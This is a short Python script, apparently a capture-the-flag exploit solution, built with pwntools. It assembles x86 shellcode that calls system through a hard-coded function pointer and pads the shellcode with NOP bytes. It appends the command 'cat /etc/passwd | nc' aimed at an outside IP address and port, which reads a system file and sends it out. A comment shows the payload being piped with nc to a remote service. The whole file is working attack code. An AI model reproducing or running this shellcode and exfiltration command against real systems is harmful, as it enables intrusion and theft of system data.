from pwn import *

#python solution.py; cat solution_shellcode | nc 119.15.167.212 31336 -v

system = 0x8048340 
shellcode = """
mov eax, 0x804a260 ;
push eax;
mov eax, DWORD PTR ds:0x804a010;
call eax;
"""
asm_shellcode = asm(shellcode)
asm_shellcode = asm_shellcode.ljust(0x200,"\x90")
asm_shellcode += "cat /etc/passwd | nc 119.15.167.216 8080\x00"

open("./solution_shellcode","w").write(asm_shellcode)